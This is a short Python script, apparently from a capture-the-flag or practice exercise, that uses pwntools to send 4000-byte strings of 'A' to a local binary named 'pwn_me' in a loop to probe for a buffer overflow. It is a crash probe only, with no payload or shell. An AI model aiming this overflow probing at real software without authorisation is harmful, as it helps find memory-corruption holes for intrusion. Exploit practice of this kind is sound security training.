from pwn import *

p = process("./pwn_me")

def first_overflow():
    while True:
        p.sendlineafter(b'PROMPT>', b'A'*4000)
        print(p.recv())

if __name__=='__main__':
    first_overflow()
